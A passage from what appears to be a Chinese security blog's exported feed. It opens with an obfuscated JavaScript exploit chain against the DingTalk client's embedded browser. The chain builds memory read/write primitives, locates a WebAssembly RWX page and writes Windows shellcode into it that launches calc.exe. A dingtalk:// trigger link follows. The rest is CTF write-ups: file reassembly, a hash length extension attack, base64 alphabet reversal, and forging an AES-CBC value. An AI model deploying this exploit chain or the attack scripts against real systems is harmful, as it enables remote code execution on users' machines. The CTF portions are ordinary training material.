_0x5d479b=0x0,_0xde7a28,_0x1ef172,_0x26c98e=0x0;_0x1ef172=_0x352a1c[&#x27;charAt&#x27;](_0x26c98e++);~_0x1ef172&amp;&amp;(_0xde7a28=_0x5d479b%0x4?_0xde7a28*0x40+_0x1ef172:_0x1ef172,_0x5d479b++%0x4)?_0x194774+=String[&#x27;fromCharCode&#x27;](0xff&amp;_0xde7a28&gt;&gt;(-0x2*_0x5d479b&amp;0x6)):0x0)&#123;_0x1ef172=_0x3ad59d[&#x27;indexOf&#x27;](_0x1ef172);&#125;return _0x194774;&#125;);&#125;());var _0xa07d5c=function(_0x5c13fe,_0x1ca04c)&#123;var _0x48ea63=[],_0x8f6b18=0x0,_0x30c8e4,_0xb17e6=&#x27;&#x27;,_0x53b898=&#x27;&#x27;;_0x5c13fe=atob(_0x5c13fe);for(var _0x52b8af=0x0,_0x1cd1ff=_0x5c13fe[&#x27;length&#x27;];_0x52b8af&lt;_0x1cd1ff;_0x52b8af++)&#123;_0x53b898+=&#x27;%&#x27;+(&#x27;00&#x27;+_0x5c13fe[&#x27;charCodeAt&#x27;](_0x52b8af)[&#x27;toString&#x27;](0x10))[&#x27;slice&#x27;](-0x2);&#125;_0x5c13fe=decodeURIComponent(_0x53b898);var _0x49825d;for(_0x49825d=0x0;_0x49825d&lt;0x100;_0x49825d++)&#123;_0x48ea63[_0x49825d]=_0x49825d;&#125;for(_0x49825d=0x0;_0x49825d&lt;0x100;_0x49825d++)&#123;_0x8f6b18=(_0x8f6b18+_0x48ea63[_0x49825d]+_0x1ca04c[&#x27;charCodeAt&#x27;](_0x49825d%_0x1ca04c[&#x27;length&#x27;]))%0x100;_0x30c8e4=_0x48ea63[_0x49825d];_0x48ea63[_0x49825d]=_0x48ea63[_0x8f6b18];_0x48ea63[_0x8f6b18]=_0x30c8e4;&#125;_0x49825d=0x0;_0x8f6b18=0x0;for(var _0x17f739=0x0;_0x17f739&lt;_0x5c13fe[&#x27;length&#x27;];_0x17f739++)&#123;_0x49825d=(_0x49825d+0x1)%0x100;_0x8f6b18=(_0x8f6b18+_0x48ea63[_0x49825d])%0x100;_0x30c8e4=_0x48ea63[_0x49825d];_0x48ea63[_0x49825d]=_0x48ea63[_0x8f6b18];_0x48ea63[_0x8f6b18]=_0x30c8e4;_0xb17e6+=String[&#x27;fromCharCode&#x27;](_0x5c13fe[&#x27;charCodeAt&#x27;](_0x17f739)^_0x48ea63[(_0x48ea63[_0x49825d]+_0x48ea63[_0x8f6b18])%0x100]);&#125;return _0xb17e6;&#125;;_0x1368[&#x27;SGqjCq&#x27;]=_0xa07d5c;_0x1368[&#x27;PalevQ&#x27;]=&#123;&#125;;_0x1368[&#x27;kUYGYC&#x27;]=!![];&#125;var _0x5a17b5=_0x1368[&#x27;PalevQ&#x27;][_0x4285cf];if(_0x5a17b5===undefined)&#123;if(_0x1368[&#x27;FXcKZO&#x27;]===undefined)&#123;_0x1368[&#x27;FXcKZO&#x27;]=!![];&#125;_0x1368bb=_0x1368[&#x27;SGqjCq&#x27;](_0x1368bb,_0x1b1736);_0x1368[&#x27;PalevQ&#x27;][_0x4285cf]=_0x1368bb;&#125;else&#123;_0x1368bb=_0x5a17b5;&#125;return _0x1368bb;&#125;;const max_size=0x2710;const buf=new ArrayBuffer(0x8);const f64=new Float64Array(buf);const u32=new Uint32Array(buf);function f2i(_0x5ba462)&#123;f64[0x0]=_0x5ba462;let _0x3b54a5=Array[&#x27;from&#x27;](u32);return _0x3b54a5[0x1]*0x100000000+_0x3b54a5[0x0];&#125;function i2f(_0x2f58b4)&#123;let _0x8b3c4c=[];_0x8b3c4c[0x0]=parseInt(_0x2f58b4%0x100000000);_0x8b3c4c[0x1]=parseInt((_0x2f58b4-_0x8b3c4c[0x0])/0x100000000);u32[_0x1368(&#x27;0x38&#x27;,&#x27;XQdw&#x27;)](_0x8b3c4c);return f64[0x0];&#125;function d2u(_0x9ff56e)&#123;f64[0x0]=_0x9ff56e;let _0x47fd50=Array[_0x1368(&#x27;0xa&#x27;,&#x27;7rtu&#x27;)](u32);return _0x47fd50;&#125;function u2d(_0x535342,_0x2feac9)&#123;u32[0x0]=_0x535342;u32[0x1]=_0x2feac9;return f64[0x0];&#125;function print(_0x510c7e)&#123;document[_0x1368(&#x27;0x29&#x27;,&#x27;1027&#x27;)](_0x1368(&#x27;0x16&#x27;,&#x27;pndm&#x27;)+_0x510c7e+_0x1368(&#x27;0x19&#x27;,&#x27;@XkD&#x27;));&#125;function hex(_0x2abe47)&#123;return _0x2abe47[_0x1368(&#x27;0x45&#x27;,&#x27;Ob1V&#x27;)](0x10)[_0x1368(&#x27;0x3&#x27;,&#x27;@XkD&#x27;)](0x10,&#x27;0&#x27;);&#125;function success_value(_0x140a70,_0x2c5308)&#123;console[_0x1368(&#x27;0x11&#x27;,&#x27;THAJ&#x27;)](_0x1368(&#x27;0x15&#x27;,&#x27;ki5k&#x27;)+_0x140a70+hex(_0x2c5308));&#125;function wasm_func()&#123;var _0x1ab208=&#123;&#x27;env&#x27;:&#123;&#x27;puts&#x27;:function _0x36676a(_0x4b8a69)&#123;console[_0x1368(&#x27;0x1b&#x27;,&#x27;*I%3&#x27;)](_0x4b8a69);&#125;&#125;&#125;;var _0x364582=new Uint8Array([0x0,0x61,0x73,0x6d,0x1,0x0,0x0,0x0,0x1,0x89,0x80,0x80,0x80,0x0,0x2,0x60,0x1,0x7f,0x1,0x7f,0x60,0x0,0x0,0x2,0x8c,0x80,0x80,0x80,0x0,0x1,0x3,0x65,0x6e,0x76,0x4,0x70,0x75,0x74,0x73,0x0,0x0,0x3,0x82,0x80,0x80,0x80,0x0,0x1,0x1,0x4,0x84,0x80,0x80,0x80,0x0,0x1,0x70,0x0,0x0,0x5,0x83,0x80,0x80,0x80,0x0,0x1,0x0,0x1,0x6,0x81,0x80,0x80,0x80,0x0,0x0,0x7,0x92,0x80,0x80,0x80,0x0,0x2,0x6,0x6d,0x65,0x6d,0x6f,0x72,0x79,0x2,0x0,0x5,0x68,0x65,0x6c,0x6c,0x6f,0x0,0x1,0xa,0x8d,0x80,0x80,0x80,0x0,0x1,0x87,0x80,0x80,0x80,0x0,0x0,0x41,0x10,0x10,0x0,0x1a,0xb,0xb,0x92,0x80,0x80,0x80,0x0,0x1,0x0,0x41,0x10,0xb,0xc,0x48,0x65,0x6c,0x6c,0x6f,0x20,0x57,0x6f,0x72,0x6c,0x64,0x0]);let _0x17d97a=new WebAssembly[(_0x1368(&#x27;0x6&#x27;,&#x27;*I%3&#x27;))](new WebAssembly[(_0x1368(&#x27;0x26&#x27;,&#x27;h0rH&#x27;))](_0x364582),_0x1ab208);let _0x4137b4=new Uint8Array(_0x17d97a[_0x1368(&#x27;0x28&#x27;,&#x27;U7m4&#x27;)][_0x1368(&#x27;0x22&#x27;,&#x27;U7m4&#x27;)][_0x1368(&#x27;0x2a&#x27;,&#x27;CQJJ&#x27;)]);return _0x17d97a[_0x1368(&#x27;0x4&#x27;,&#x27;qxzt&#x27;)][_0x1368(&#x27;0x13&#x27;,&#x27;THAJ&#x27;)];&#125;func=wasm_func();function gc()&#123;for(let _0x636073=0x0;_0x636073&lt;0x10;_0x636073++)&#123;new Array(0x1000000);&#125;&#125;function debug()&#123;for(let _0x1aae5c=0x0;_0x1aae5c&lt;0x10000;_0x1aae5c++)&#123;for(let _0x206767=0x0;_0x206767&lt;0x20000;_0x206767++)&#123;var _0x4e0be5=_0x4e0be5+_0x1aae5c+_0x206767;&#125;&#125;&#125;global_object=&#123;&#125;;setPropertyViaEmbed=(_0x704953,_0xabb024,_0x54136d)=&gt;&#123;const _0x57fb88=document[_0x1368(&#x27;0x5&#x27;,&#x27;qlp^&#x27;)](_0x1368(&#x27;0x3b&#x27;,&#x27;e8CW&#x27;));_0x57fb88[_0x1368(&#x27;0x3a&#x27;,&#x27;h0rH&#x27;)]=_0x54136d;_0x57fb88[&#x27;type&#x27;]=_0x1368(&#x27;0x46&#x27;,&#x27;E5A6&#x27;);Object[&#x27;setPrototypeOf&#x27;](global_object,_0x57fb88);document[_0x1368(&#x27;0x1f&#x27;,&#x27;4nv[&#x27;)][_0x1368(&#x27;0x35&#x27;,&#x27;ow9l&#x27;)](_0x57fb88);_0x704953[_0x1368(&#x27;0x23&#x27;,&#x27;p]KF&#x27;)]=_0xabb024;_0x57fb88[_0x1368(&#x27;0x25&#x27;,&#x27;QvKY&#x27;)]();&#125;;createCorruptedPair=(_0x16735d,_0x65366a)=&gt;&#123;const _0x5a7565=&#123;&#x27;__proto__&#x27;:global_object&#125;;_0x5a7565[_0x1368(&#x27;0x47&#x27;,&#x27;*I%3&#x27;)]=0x1;setPropertyViaEmbed(_0x5a7565,_0x65366a,()=&gt;&#123;Object[_0x1368(&#x27;0x2c&#x27;,&#x27;e8CW&#x27;)](global_object,null);_0x5a7565[_0x1368(&#x27;0x8&#x27;,&#x27;Ub)S&#x27;)]=_0x16735d;&#125;);const _0x2dc8d4=&#123;&#x27;__proto__&#x27;:global_object&#125;;_0x2dc8d4[_0x1368(&#x27;0x43&#x27;,&#x27;THAJ&#x27;)]=0x1;setPropertyViaEmbed(_0x2dc8d4,_0x65366a,()=&gt;&#123;Object[_0x1368(&#x27;0x1&#x27;,&#x27;@XkD&#x27;)](global_object,null);_0x2dc8d4[_0x1368(&#x27;0xb&#x27;,&#x27;*j!$&#x27;)]=_0x16735d;_0x5a7565[_0x1368(&#x27;0x2&#x27;,&#x27;5I39&#x27;)]=1.1;&#125;);return[_0x5a7565,_0x2dc8d4];&#125;;const array=[5.5,1.1];array[&#x27;prop&#x27;]=0x1;const test1=new BigUint64Array(0x2);var oob_array=[1.1,2.2,3.3];obj_array=&#123;&#x27;m&#x27;:0x539,&#x27;target&#x27;:gc&#125;;ab=new ArrayBuffer(0x1337);gc();gc();gc();var test=[oob_array,oob_array,oob_array,oob_array,oob_array];test[_0x1368(&#x27;0x41&#x27;,&#x27;qlp^&#x27;)]=0x1;const [object_1,object_2]=createCorruptedPair(array,test);jit=(_0x166e60,_0x539576,_0x1ae253)=&gt;&#123;return _0x166e60[&#x27;corrupted_prop&#x27;][_0x539576];&#125;;for(var i=0x0;i&lt;0x10000;++i)jit(object_1,0x0);var leak=jit(object_2,0x0);elem=d2u(leak)[0x0];print(&#x27;0x&#x27;+hex(elem));const num=u2d(elem+0x4,elem+0x4);const num2=u2d(elem,elem);proto2=&#123;&#125;;setPropertyViaEmbed2=(_0x3c4ce8,_0x5b3f78,_0x570b6e)=&gt;&#123;const _0x1411bc=document[_0x1368(&#x27;0x3e&#x27;,&#x27;NbDf&#x27;)](_0x1368(&#x27;0x2d&#x27;,&#x27;54b8&#x27;));_0x1411bc[_0x1368(&#x27;0x44&#x27;,&#x27;MqJl&#x27;)]=_0x570b6e;_0x1411bc[_0x1368(&#x27;0x0&#x27;,&#x27;QvKY&#x27;)]=_0x1368(&#x27;0x42&#x27;,&#x27;Xp#V&#x27;);Object[_0x1368(&#x27;0x1e&#x27;,&#x27;djTM&#x27;)](proto2,_0x1411bc);document[_0x1368(&#x27;0xd&#x27;,&#x27;h0rH&#x27;)][_0x1368(&#x27;0x3d&#x27;,&#x27;54b8&#x27;)](_0x1411bc);_0x3c4ce8[_0x1368(&#x27;0x33&#x27;,&#x27;4nv[&#x27;)]=_0x5b3f78;_0x1411bc[&#x27;remove&#x27;]();&#125;;createCorruptedPair2=(_0x31208b,_0x4b08b5)=&gt;&#123;const _0x2fdefd=&#123;&#x27;__proto__&#x27;:proto2&#125;;_0x2fdefd[_0x1368(&#x27;0x27&#x27;,&#x27;pndm&#x27;)]=0x1;setPropertyViaEmbed2(_0x2fdefd,_0x4b08b5,()=&gt;&#123;Object[&#x27;setPrototypeOf&#x27;](proto2,null);_0x2fdefd[_0x1368(&#x27;0x36&#x27;,&#x27;@XkD&#x27;)]=_0x31208b;&#125;);const _0x5a6d27=&#123;&#x27;__proto__&#x27;:proto2&#125;;_0x5a6d27[_0x1368(&#x27;0x3c&#x27;,&#x27;XQdw&#x27;)]=0x1;setPropertyViaEmbed2(_0x5a6d27,_0x4b08b5,()=&gt;&#123;Object[_0x1368(&#x27;0x9&#x27;,&#x27;*I%3&#x27;)](proto2,null);_0x5a6d27[_0x1368(&#x27;0xc&#x27;,&#x27;eHuP&#x27;)]=_0x31208b;_0x2fdefd[_0x1368(&#x27;0x14&#x27;,&#x27;QvKY&#x27;)]=1.1;&#125;);return[_0x2fdefd,_0x5a6d27];&#125;;const [object_3,object_4]=createCorruptedPair2(array,num2);jit22=(_0x15b278,_0x32c377)=&gt;&#123;_0x15b278[_0x1368(&#x27;0x31&#x27;,&#x27;*clI&#x27;)][_0x32c377]=num2;_0x15b278[_0x1368(&#x27;0x12&#x27;,&#x27;1#r2&#x27;)][_0x32c377+0x1]=1.1;return _0x15b278[_0x1368(&#x27;0x1d&#x27;,&#x27;ow9l&#x27;)][_0x32c377];&#125;;for(var i=0x0;i&lt;0x100000;++i)jit22(object_3,0x0);var leak2=jit22(object_4,0x0);var object_idx=undefined;var object_idx_flag=undefined;for(let i=0x0;i&lt;max_size;i++)&#123;if(d2u(oob_array[i])[0x0]==0xa72)&#123;print(_0x1368(&#x27;0x2b&#x27;,&#x27;CQJJ&#x27;)+i+_0x1368(&#x27;0x18&#x27;,&#x27;O6t]&#x27;));print(&#x27;target:\x20i:\x20&#x27;+i+&#x27;\x20hi\x201&#x27;);object_idx=i;object_idx_flag=0x1;break;&#125;if(d2u(oob_array[i])[0x1]==0xa72)&#123;print(_0x1368(&#x27;0x7&#x27;,&#x27;3nrn&#x27;)+i+_0x1368(&#x27;0x2f&#x27;,&#x27;djTM&#x27;));print(&#x27;target:\x20i:\x20&#x27;+(i+0x1)+_0x1368(&#x27;0x18&#x27;,&#x27;O6t]&#x27;));object_idx=i+0x1;object_idx_flag=0x0;break;&#125;&#125;function addrof(_0x71fee0)&#123;obj_array[_0x1368(&#x27;0x32&#x27;,&#x27;qlp^&#x27;)]=_0x71fee0;return d2u(oob_array[object_idx])[object_idx_flag]-0x1;&#125;var ab_addr=addrof(ab);print(&#x27;test:\x20&#x27;+hex(ab_addr));var bk_idx=undefined;var bk_idx_flag=undefined;let flag=0x0;for(let i=0x0;i&lt;max_size;i++)&#123;if(d2u(oob_array[i])[0x0]==0x1337)&#123;console[_0x1368(&#x27;0x20&#x27;,&#x27;qxzt&#x27;)](_0x1368(&#x27;0x40&#x27;,&#x27;M*(X&#x27;)+i+_0x1368(&#x27;0x2e&#x27;,&#x27;1027&#x27;));console[_0x1368(&#x27;0x37&#x27;,&#x27;ki5k&#x27;)](_0x1368(&#x27;0x17&#x27;,&#x27;Ob1V&#x27;)+i+_0x1368(&#x27;0xe&#x27;,&#x27;*I%3&#x27;));bk_idx=i;bk_idx_flag=0x1;break;&#125;if(d2u(oob_array[i])[0x1]==0x1337)&#123;console[&#x27;log&#x27;](&#x27;m:\x20i:\x20&#x27;+i+_0x1368(&#x27;0x24&#x27;,&#x27;qxzt&#x27;));console[_0x1368(&#x27;0xf&#x27;,&#x27;0$K8&#x27;)](_0x1368(&#x27;0x10&#x27;,&#x27;1#r2&#x27;)+(i+0x1)+_0x1368(&#x27;0x30&#x27;,&#x27;roPh&#x27;));bk_idx=i+0x1;bk_idx_flag=0x0;break;&#125;&#125;var dv=new DataView(ab);var bk_addr=d2u(oob_array[bk_idx]);function get_32(_0x251c0e)&#123;var _0x524bc3=d2u(oob_array[bk_idx]);if(bk_idx_flag==0x0)&#123;oob_array[bk_idx]=u2d(_0x251c0e,_0x524bc3[0x1]);&#125;else&#123;oob_array[bk_idx]=u2d(_0x524bc3[0x0],_0x251c0e);&#125;return dv[&#x27;getUint32&#x27;](0x0,!![]);&#125;function set_32(_0x2f8305,_0x1a3c26)&#123;var _0xd022f7=d2u(oob_array[bk_idx]);if(bk_idx_flag==0x0)&#123;oob_array[bk_idx]=u2d(_0x2f8305,_0xd022f7[0x1]);&#125;else&#123;oob_array[bk_idx]=u2d(_0xd022f7[0x0],_0x2f8305);&#125;dv[_0x1368(&#x27;0x1a&#x27;,&#x27;Ob1V&#x27;)](0x0,_0x1a3c26,!![]);&#125;function set_8(_0x5d0cd7,_0x575a5c)&#123;var _0x50493b=d2u(oob_array[bk_idx]);if(bk_idx_flag==0x0)&#123;oob_array[bk_idx]=u2d(_0x5d0cd7,_0x50493b[0x1]);&#125;else&#123;oob_array[bk_idx]=u2d(_0x50493b[0x0],_0x5d0cd7);&#125;dv[_0x1368(&#x27;0x34&#x27;,&#x27;tZnn&#x27;)](0x0,_0x575a5c,!![]);&#125;var wasm_func_addr=addrof(func);print(_0x1368(&#x27;0x39&#x27;,&#x27;54b8&#x27;)+hex(wasm_func_addr));var shared_info_addr=get_32(wasm_func_addr+0xc)-0x1;print(_0x1368(&#x27;0x48&#x27;,&#x27;Xp#V&#x27;)+hex(shared_info_addr));var export_function_data_addr=get_32(shared_info_addr+0x4)-0x1;print(&#x27;export_function_data_addr\x20is:\x20&#x27;+hex(export_function_data_addr));var wasm_instance_addr=get_32(export_function_data_addr+0x8)-0x1;print(_0x1368(&#x27;0x1c&#x27;,&#x27;p]KF&#x27;)+hex(wasm_instance_addr));var rwx_addr=get_32(wasm_instance_addr+0x40);print(_0x1368(&#x27;0x3f&#x27;,&#x27;M*(X&#x27;)+hex(rwx_addr));var shellcode=new Uint8Array([0x89,0xe5,0x83,0xec,0x20,0x31,0xdb,0x64,0x8b,0x5b,0x30,0x8b,0x5b,0xc,0x8b,0x5b,0x1c,0x8b,0x1b,0x8b,0x1b,0x8b,0x43,0x8,0x89,0x45,0xfc,0x8b,0x58,0x3c,0x1,0xc3,0x8b,0x5b,0x78,0x1,0xc3,0x8b,0x7b,0x20,0x1,0xc7,0x89,0x7d,0xf8,0x8b,0x4b,0x24,0x1,0xc1,0x89,0x4d,0xf4,0x8b,0x53,0x1c,0x1,0xc2,0x89,0x55,0xf0,0x8b,0x53,0x14,0x89,0x55,0xec,0xeb,0x32,0x31,0xc0,0x8b,0x55,0xec,0x8b,0x7d,0xf8,0x8b,0x75,0x18,0x31,0xc9,0xfc,0x8b,0x3c,0x87,0x3,0x7d,0xfc,0x66,0x83,0xc1,0x8,0xf3,0xa6,0x74,0x5,0x40,0x39,0xd0,0x72,0xe4,0x8b,0x4d,0xf4,0x8b,0x55,0xf0,0x66,0x8b,0x4,0x41,0x8b,0x4,0x82,0x3,0x45,0xfc,0xc3,0xba,0x78,0x78,0x65,0x63,0xc1,0xea,0x8,0x52,0x68,0x57,0x69,0x6e,0x45,0x89,0x65,0x18,0xe8,0xb8,0xff,0xff,0xff,0x31,0xc9,0x51,0x68,0x2e,0x65,0x78,0x65,0x68,0x63,0x61,0x6c,0x63,0x89,0xe3,0x41,0x51,0x53,0xff,0xd0,0x31,0xc9,0xb9,0x1,0x65,0x73,0x73,0xc1,0xe9,0x8,0x51,0x68,0x50,0x72,0x6f,0x63,0x68,0x45,0x78,0x69,0x74,0x89,0x65,0x18,0xe8,0x87,0xff,0xff,0xff,0x31,0xd2,0x52,0xff,0xd0]);for(let i=0x0;i&lt;shellcode[_0x1368(&#x27;0x21&#x27;,&#x27;h0rH&#x27;)];i++)set_8(rwx_addr+i,shellcode[i]);func();
&lt;/script&gt;
&lt;/body&gt;

&lt;/html&gt;</code></pre>
<pre><code class="hljs plaintext">test
0x0000000000000000

test: 0000000000000NaN

wasm_func_addr is: 0000000000000NaN

shared_info_addr is: 00000000000000-1

export_function_data_addr is: 00000000000000-1

wasm_instance_addr is: 00000000000000-1

rwx addr is: 0000000000000000</code></pre>
<h1 id="漏洞复现">漏洞复现</h1>
<pre><code class="hljs plaintext">dingtalk://dingtalkclient/page/link?url=127.0.0.1/1.html&amp;pc_slide=true</code></pre>
<p><img src="https://z4a.net/images/2022/06/14/image29769b4395a0f593.png" alt="image29769b4395a0f593.png"></p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title>2023铁三第一赛区分区赛</title>
    <url>/2023/01/10/%E9%93%81%E4%B8%89/</url>
    <content><![CDATA[<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230110233516764.png?x-oss-process=hzy" alt="image-20230110233516764"></p>
<span id="more"></span>
<h1 id="前言">前言</h1>
<p>比赛好卷，题目好难，十道题目就出了四道，排名第二十一名，明年继续努力</p>
<h1 id="一生壹世">一生壹世</h1>
<p>压缩包注释提示得到解压密码是1314</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202302011639499.png?x-oss-process=hzy" alt="img"></p>
<p>解压之后得到四个txt文件</p>
<p>010打开分析发现文件头第一个字节拼接是个png的hex头</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202302011639496.png?x-oss-process=hzy" alt="img"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202302011639509.png?x-oss-process=hzy" alt="img"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202302011639510.png?x-oss-process=hzy" alt="img"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202302011639508.png?x-oss-process=hzy" alt="img"></p>
<p>所以不难猜出是一个png图片，数据被拆分到这四个文件中了</p>
<p>然后发现四个txt文件都是1669字节</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202302011639511.png?x-oss-process=hzy" alt="img"></p>
<p>所以写个python脚本循环1669次依次读取文件字节并写入到同一个png文件进行整合即可，脚本如下</p>
<pre><code class="hljs plaintext">flag1=open(&#x27;一.txt&#x27;,&quot;rb&quot;)

flag2=open(&#x27;生.txt&#x27;,&quot;rb&quot;)

flag3=open(&#x27;壹.txt&#x27;,&quot;rb&quot;)

flag4=open(&#x27;世.txt&#x27;,&quot;rb&quot;)

true_flag=open(&quot;flag.png&quot;,&quot;wb&quot;)

 

data=[]

for a in range(1669):

  i = flag1.read(1)

  data.append(i)

  i = flag2.read(1)

  data.append(i)

  i = flag3.read(1)

  data.append(i)

  i = flag4.read(1)

  data.append(i)

for i in data:

  true_flag.write(i)

print(&quot;success!!!&quot;)</code></pre>
<p>得到flag</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202302011639967.png?x-oss-process=hzy" alt="img"></p>
<p>Flag{JPG}</p>
<h1 id="hashattack">Hashattack</h1>
<p>扫目录发现存在git源码泄露</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202302011639968.png?x-oss-process=hzy" alt="img"></p>
<p>通过Githack下载源码</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202302011639977.png?x-oss-process=hzy" alt="img"></p>
<p>得到getflag.php的源码</p>
<pre><code class="hljs plaintext">&lt;?php 

error_reporting(0);

include &quot;flag.php&quot;;

$user=$_POST[&#x27;user&#x27;];

function encrypt($text)&#123;

  global $key;

  return md5($key.$text);

&#125;

if (encrypt($user)===$_COOKIE[&#x27;verify&#x27;]) &#123;

  if(is_numeric(strpos($user,&#x27;root&#x27;)))&#123;

​    die($flag);

  &#125;

  else&#123;

​    die(&#x27;not root！！！&#x27;);

  &#125;

&#125;

else&#123;

  setcookie(&quot;verify&quot;,encrypt(&quot;guest&quot;),time()+60*60*24);

  setcookie(&quot;len&quot;,strlen($key),time()+60*60*24);

&#125;

//show_source(__FILE__);</code></pre>
<p>分析源码可得是哈希长度扩展攻击，抓包从cookie可以得知len=32，并且user和verify可控</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202302011639987.png?x-oss-process=hzy" alt="img"></p>
<p>直接使用hashpump获得签名和root相关cookie等数据</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202302011639993.png?x-oss-process=hzy" alt="img"></p>
<p>\x-&gt;%然后替换cookie和user传参即可得到flag</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202302011639997.png?x-oss-process=hzy" alt="img"></p>
<p>flag{65089e251c4084e4ef5fad52221a3b0e}</p>
<h1 id="rand5">Rand5</h1>
<p>elf文件</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202302011639444.png?x-oss-process=hzy" alt="img"></p>
<p>分析源码</p>
<p>gtable是读出码表（可以动态调试出）</p>
<p>encode是base64加密（换码表了）</p>
<p>用gdb调试得出每次的v3</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202302011639519.png?x-oss-process=hzy" alt="img"></p>
<p>分别如下：</p>
<pre><code class="hljs plaintext">1.#nopqrstuvwxyz0123456789/+ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklm
2.#GHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789/+ABCDEF
3.#pqrstuvwxyz0123456789/+ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmno
4.#z0123456789/+ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxy
5.#RSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789/+ABCDEFGHIJKLMNOPQ</code></pre>
<p>倒着换码表base64解密</p>
<p>最后一次的脚本如下：</p>
<pre><code class="hljs plaintext">import base64
a=list(&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;)
b=&#x27;nopqrstuvwxyz0123456789/+ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklm&#x27;                                                #转换后的码表
c=&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;
s=&#x27;ANYIAeTXAqvez9+c1qoI1t0L06DYAt7X19zY+d7cz6+g1tsJ+/b=&#x27;     #加密后的
c=str.maketrans(b,c)
print(base64.b64decode(s.translate(c)))</code></pre>
<p>s是加密后的内容</p>
<p>b是调试出来的码表</p>
<p>第一次的脚本中s为</p>
<pre><code class="hljs plaintext">cISes12ZhleYs3qDloWqbFZHknejdFi2hm1BelxFllKWnUhAiHFItF6rhkehs1WmbF6eiGaolnN8mGiCjUd8r1irknN8iEyUhl6ieVZDeH2VtmVDjUapt1q+dHFKsm20inGmcFWohoSYn1VEiG6ptFaXuHKed1GBkFq3rlCBint=</code></pre>
<p>得出结果作为第二个s</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202302011639708.png?x-oss-process=hzy" alt="img"></p>
<p>flag{0d271f580a8cd571de09c1ce51698aba}</p>
<h1 id="cbc">CBC</h1>
<p>CBC字节反转攻击</p>
<p>分析源码发现需要求出base64_cipher，而username和password都是admin</p>
<p>已知key= abcdef0123456789，iv= 1234567891234567</p>
<p>直接构造exp如下</p>
<pre><code class="hljs plaintext">import base64

from Crypto.Util.Padding import pad

from Crypto.Cipher import AES

 

key=b&quot;abcdef0123456789&quot;

iv=b&quot;1234567891234567&quot;

 

user=&quot;username:admin;password:admin&quot;

data = lambda s:s+(16 - len(s)%16) * chr(0) 

success_data = data(user)

\#print(success_data)

base64_cipher = AES.new(key, AES.MODE_CBC, iv)

d =base64_cipher.encrypt(success_data.encode(&#x27;utf8&#x27;))

print(base64.b64encode(d))</code></pre>
<p>得到b’idVegWpPAM8A414waIjDKaG7eLLrT4vtnR1WIO9x6do=’</p>
<p>Get传参</p>
<pre><code class="hljs plaintext">?username=admin&amp;password=admin&amp;base64_cipher=idVegWpPAM8A414waIjDKaG7eLLrT4vtnR1WIO9x6do=</code></pre>
<p>得到flag</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202302011639706.png?x-oss-process=hzy" alt="img"></p>
<p>flag{e8fdddd52655347073194f347e05e5cd}</p>
]]></content>
      <categories>
        <category>赛后复盘</category>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>赛后复盘</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>CTFSHOW VIP限免题目</title>
    <url>/2022/06/13/%E9%99%90%E5%85%8D%E9%A2%98%E7%9B%AE/</url>
    <content><![CDATA[<p><img src="https://z4a.net/images/2022/06/13/imagebff27e0294c5cf3d.png" alt="imagebff27e0294c5cf3d.png"></p>
<span id="more"></span>
<h1 id="源码泄露">源码泄露</h1>
<blockquote>
<p>开发注释未及时删除</p>
</blockquote>
<p>看源码得flag</p>
<pre><code class="hljs plaintext">ctfshow&#123;b031ed1a-2f1f-4252-a226-c38d1becbc4c&#125;</code></pre>
<h1 id="前台js绕过">前台JS绕过</h1>
<blockquote>
<p>js前台拦截 === 无效操作</p>
</blockquote>
<p>ctrl+u</p>
<pre><code class="hljs plaintext">ctfshow&#123;46b7caf2-3b52-4527-8878-82c9b165aa48&#125;</code></pre>
<h1 id="协议头信息泄露">协议头信息泄露</h1>
<blockquote>
<p>没思路的时候抓个包看看，可能会有意外收获</p>
</blockquote>
<p>抓包得到flag</p>
<p><img src="https://z4a.net/images/2022/06/13/image.png" alt="image.png"></p>
<pre><code class="hljs plaintext">ctfshow&#123;cafe96b4-abc8-469d-92a2-2aec7a1b2a23&#125;</code></pre>
<h1 id="robots后台泄露">robots后台泄露</h1>
<blockquote>
<p>总有人把后台地址写入robots，帮黑阔大佬们引路。</p>
</blockquote>
<p><code>/robots.txt</code>得到flag路径是<code>/flagishere.txt</code></p>
<p><img src="https://z4a.net/images/2022/06/13/imagea10be7912b6e84f9.png" alt="imagea10be7912b6e84f9.png"></p>
<p>访问得到flag</p>
<pre><code class="hljs plaintext">ctfshow&#123;f4094b7a-e1d1-40ea-ad11-1e141f910b68&#125;</code></pre>
